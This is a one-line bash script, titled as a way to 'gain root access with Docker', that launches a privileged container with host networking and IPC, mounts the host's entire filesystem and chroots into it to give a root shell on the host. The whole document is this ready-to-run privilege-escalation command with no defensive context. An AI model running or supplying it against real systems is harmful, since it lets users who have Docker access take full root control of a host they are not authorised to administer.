#!/bin/bash
#
# Gain root access with Docker

set -e

exec docker run --rm -it --privileged --net=host --ipc=host -v /:/host alpine chroot /host

